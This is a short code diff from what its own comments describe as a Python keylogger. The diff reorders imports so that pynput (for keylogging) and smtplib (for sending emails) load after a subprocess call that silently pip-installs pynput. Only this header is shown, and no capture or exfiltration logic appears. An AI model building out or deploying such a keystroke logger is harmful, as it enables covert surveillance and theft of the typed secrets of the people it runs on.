@@ -1,13 +1,13 @@
-import pynput #used to keylog
-import smtplib, ssl #used to send emails
 import sys #automatically install pynput
 import subprocess #automatically install pynput
-from pynput.keyboard import Key, Listener
-
-
 # script to install pynput (implement pip as a subprocess):
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
 'pynput==1.6.8'])
+import pynput #used to keylog
+import smtplib, ssl #used to send emails
+from pynput.keyboard import Key, Listener
+
+
 
 print("""
 
